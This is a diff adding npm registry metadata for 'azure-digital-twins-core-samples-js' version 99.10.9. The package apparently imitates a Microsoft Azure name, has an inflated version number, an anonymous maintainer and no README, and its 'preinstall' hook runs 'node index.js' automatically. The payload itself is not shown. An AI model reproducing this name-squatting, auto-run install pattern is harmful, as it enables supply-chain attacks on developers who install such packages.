@@ -1,0 +1,62 @@
+{
+    "_id": "azure-digital-twins-core-samples-js",
+    "name": "azure-digital-twins-core-samples-js",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-digital-twins-core-samples-js",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-digital-twins-core-samples-js@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-0/9uRdfa7OGNyKQY5xQsqOSs9DX7+mapDc6dp1l+je22kar+CGqhq7C16ZDVffWHr7QBlCf2kCokGeB1Qkl6LQ==",
+                "shasum": "143468da7a8073f5a7aaad68b0bd5b0f097f8056",
+                "tarball": "https://registry.npmjs.org/azure-digital-twins-core-samples-js/-/azure-digital-twins-core-samples-js-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5087,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOo9RACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoZxQ//ZhEwW9+DH6EEpdy+VzuX+2W5u15yKiDxNfG7/K/C654UHR7Q\r\nYdYtjfBYyR3SUcwi4QpHlAM3RpXsSYPUnjWzcNa2P9mErvmf/GtNdymk1Zgc\r\nabtPfiY6650pXpK9ngbrmLCouCt/a1EgFkmOfnZty0KzaYDOJM0mYMVhRxCg\r\nObs1f7SsbxkaHrU57kBkAOkDynZ7RDYRD9+XGKo7e6Bmxhb5ZAO8SH8Td+IF\r\nvaTmyWKb4wPM/2DX52fcvsv5l1FJzPhhLy9ij3XswZarCGAb6kMH2Dwii34h\r\nmGeQ7+1Iucc6c645o9Ipf9ifr2dV5iUXGRpJ5OoousIH4/ofx6WaXgw89eTy\r\n2q02BCIJb2oPd/Dx/6DgnMlOZTSkxiFXV0JKjg8Hbj5kBQ24NgX3DwujbeMy\r\nwUyBVbNcSB57plu1cwE+hv3F3QAHdSl6QscKbIOhOj0DPgtaMnhTB/eXW75z\r\npBppoOhA8Ifh06BQXTw239Z1pypRDpBayofofmPMO1jkt/CfdbHHxI4aBf3Z\r\nrNkjf8qTkl7dsSL4ASWbf1Psa92EhbMB1b7rDb7VwvhzyUBXHNprcyvcCVim\r\nFZEnx4pnrYviAenxbLQmG/b5oxzNfjQDb8j6jBOwGtLAv26hPZIkWctdIUFU\r\nwrNrnWbYRWJFWiX0j6R1A5BWqHzeixbuCQ0=\r\n=J/Jk\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "7h9f3knn",
+                "email": "7h9f3knn@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "7h9f3knn",
+                    "email": "7h9f3knn@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-digital-twins-core-samples-js_99.10.9_1648004945489_0.7792498553378409"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T03:09:05.488Z",
+        "99.10.9": "2022-03-23T03:09:05.631Z",
+        "modified": "2022-03-23T03:09:05.751Z"
+    },
+    "maintainers": [
+        {
+            "name": "7h9f3knn",
+            "email": "7h9f3knn@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
